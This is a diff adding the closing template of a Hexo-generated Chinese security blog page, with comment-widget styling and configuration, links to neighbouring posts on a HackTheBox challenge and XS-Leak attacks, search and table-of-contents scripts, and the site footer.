+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+        appKey: 'ermlV1eoB1YODT088EdXjo6C',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/04/13/HackTheBox-Diogenes-Rage/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="HackTheBox-Diogenes&#39; Rage">
+                        
+                        <span class="card-title">HackTheBox-Diogenes&#39; Rage</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            本篇文章进行了加密，若需查看请输入密码
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-13
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/HTB/" class="post-category">
+                                    HTB
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/04/10/XS%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="XS泄露漏洞学习">
+                        
+                        <span class="card-title">XS泄露漏洞学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            XS Leak 漏洞学习
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-10
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('3000')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 芜风<br />'
+            + '文章作者: Drun1baby<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2022</span>
+            
+            <span id="year">2021</span>
+            <a href="/about" target="_blank">Drun1baby</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2021";
+                        var startMonth = "6";
+                        var startDate = "30";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Drun1baby/Drun1baby.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2717763591@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2717763591" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2717763591" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
